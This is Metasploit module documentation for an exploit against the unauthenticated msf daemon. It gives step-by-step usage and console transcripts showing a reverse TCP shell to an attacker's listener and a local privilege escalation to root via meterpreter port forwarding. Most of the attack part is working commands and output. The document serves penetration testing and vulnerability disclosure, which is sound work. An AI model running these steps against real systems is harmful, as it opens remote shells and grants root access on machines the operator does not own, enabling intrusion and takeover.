## Description

This module connects to the Metasploit msf daemon and uses the ruby interpreter
to achieve a shell. This module can target remote systems if the daemon is
exposed on a remote interface or it can be used for privilege escalation when
the attacker has a foothold. If used as privilege escalation, port forwarding
must be set up.

## Vulnerable Application

[Metasploit](https://github.com/rapid7/metasploit-framework) has a legacy method
of providing remote access. The msf daemon provides no means of authentication
and is therefore vulnerable against an attacker who has IP access to the daemon.

All versions of Metasploit are affected by this module, however testing has only
been performed on the following targets:

* Metasploit 5.0.0 on Ubuntu 16.04
* Metasploit 4.16.51 on Windows 7

Source code and installers:

  * [Source Code Repository](https://github.com/rapid7/metasploit-framework)
  * [Installers](https://docs.metasploit.com/docs/development/maintainers/downloads-by-version.html)

## Verification Steps

1. Start the vulnerable service: `msfd -f -q -a 0.0.0.0`
2. Start `msfconsole`
3. Do: `use exploit/multi/misc/msfd_rce_remote`
4. Do: `set RHOST [IP]`
5. Do: `set RPORT [PORT]` (default: `55554`)
6. Do: `set PAYLOAD [PAYLOAD]`
7. Do: `exploit`
8. You should get a shell


## Options

  **RHOST**

  Remote Host

  **RPORT**

  Remote port the vulnerable service is running at, default is 55554.


## Scenarios

### Remote target

  ```
  msf5 > use exploit/multi/misc/msfd_rce_remote
  msf5 exploit(multi/misc/msfd_rce_remote) > set rhost 192.168.56.101
  rhost => 192.168.56.101
  msf5 exploit(multi/misc/msfd_rce_remote) > set payload ruby/shell_reverse_tcp
  payload => ruby/shell_reverse_tcp
  msf5 exploit(multi/misc/msfd_rce_remote) > set lhost 192.168.0.17
  lhost => 192.168.0.17
  msf5 exploit(multi/misc/msfd_rce_remote) > set lport 443
  lport => 443
  msf5 exploit(multi/misc/msfd_rce_remote) > exploit

  [-] Handler failed to bind to 192.168.0.17:443:-  -
  [*] Started reverse TCP handler on 0.0.0.0:443
  [*] Command shell session 1 opened (172.17.0.2:443 -> 192.168.0.17:48152) at 2018-04-22 18:43:41 +0000

  whoami
  robin
  ```


### Local target - privilege escalation

  ```
  meterpreter > getuid
  Server username: uid=1000, gid=1000, euid=1000, egid=1000
  meterpreter > shell
  Process 17366 created.
  Channel 1 created.
  netstat -lntup|grep 55554
  (Not all processes could be identified, non-owned process info
   will not be shown, you would have to be root to see it all.)
  tcp        0      0 127.0.0.1:55554         0.0.0.0:*      LISTEN -
  ps aux | grep msfd
  root     17303  3.3 13.8 535168 283492 pts/18  Sl+  20:47   0:08 ruby ./msfd -f -q
  ^C
  Terminate channel 1? [y/N]  y
  meterpreter > portfwd add -l 55554 -p 55554 -r 127.0.0.1
  [*] Local TCP relay created: :55554 <-> 127.0.0.1:55554
  meterpreter > background
  [*] Backgrounding session 2...
  msf5 > use exploit/multi/misc/msfd_rce_remote
  msf5 exploit(multi/misc/msfd_rce_remote) > set rhost 127.0.0.1
  rhost => 127.0.0.1
  msf5 exploit(multi/misc/msfd_rce_remote) > exploit

  [-] Handler failed to bind to 192.168.0.17:443:-  -
  [*] Started reverse TCP handler on 0.0.0.0:443
  [*] Command shell session 3 opened (172.17.0.2:443 -> 192.168.0.17:48300) at 2018-04-22 18:55:19 +0000

  id
  uid=0(root) gid=0(root) groups=0(root)
  ```

